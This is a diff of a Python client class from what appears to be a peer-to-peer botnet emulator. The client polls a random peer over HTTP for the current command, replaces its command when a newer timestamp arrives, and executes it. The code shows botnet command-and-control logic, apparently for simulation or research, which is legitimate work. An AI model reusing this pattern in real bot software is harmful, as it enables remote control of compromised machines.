@@ -3,7 +3,7 @@
 import random, json, logging
 import requests
 from actors.AbstractBot import CommandExecutor
-from actors.BotCommands import BotCommands
+from actors.BotCommands import executeCurrentCommand
 from resources import emu_config
 
 
@@ -13,7 +13,7 @@ class Client(CommandExecutor):
         self.peerlist = peerlist
 
     def performDuty(self):
-        # If there is a CnC-Server in the current_peerlist
+        # If we know at least one servent
         if len(self.peerlist) > 0:
             try:
                 servent = random.choice(self.peerlist)
@@ -31,9 +31,10 @@ class Client(CommandExecutor):
 
         response = requests.get("http://%s:%s/current_command"%(servent, emu_config.PORT),
                                 headers={"Accept": "application/json"})
+
         if response.status_code == 200:
             newCmd = json.loads(response.text)
-            if newCmd != self.current_command or self.current_command is None:
+            if newCmd["timestamp"] > self.current_command["timestamp"] or self.current_command is None:
                 logging.debug("Replaced command %s with %s"%(self.current_command, newCmd))
                 self.current_command = newCmd
         else:
@@ -45,7 +46,7 @@ class Client(CommandExecutor):
         if isinstance(self.current_command, dict) and self.current_command.has_key("command") \
                 and self.current_command["command"] != "":
             try:
-                BotCommands.executeCurrentCommand(self.current_command)
+                executeCurrentCommand(self.current_command)
             except TypeError as ex:
                 logging.warning("Command %s got invalid parameters %s: %s"
                                 %(self.current_command["command"], self.current_command["kwargs"], ex.message))
